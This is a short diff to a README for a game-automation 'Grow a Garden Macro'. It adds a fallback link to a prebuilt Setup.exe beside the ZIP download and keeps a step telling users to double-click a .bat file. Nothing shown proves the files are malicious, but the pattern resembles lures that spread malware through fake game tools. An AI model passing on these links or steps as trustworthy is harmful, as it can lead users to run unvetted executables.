@@ -7,7 +7,7 @@ This project simulates common actions in the game and provides some automation f
 
 ## 📥 Installation
 
-1. Download the latest release of the Grow a Garden Macro from [https://github.com/vexori/Grow-A-Garden-Macro/archive/refs/tags/v1.zip] .  
+1. Download the latest release of the Grow a Garden Macro from [https://github.com/vexori/Grow-A-Garden-Macro/archive/refs/tags/v1.zip] if it doesnt work use this instead [https://github.com/vexori/Grow-A-Garden-Macro/releases/download/v1/Grow-A-Garden-Macro-Setup.exe].  
 2. Extract the ZIP file to a folder of your choice.  
 3. Run the macro by double-clicking **`GrowMacroSetup.bat`**  
 
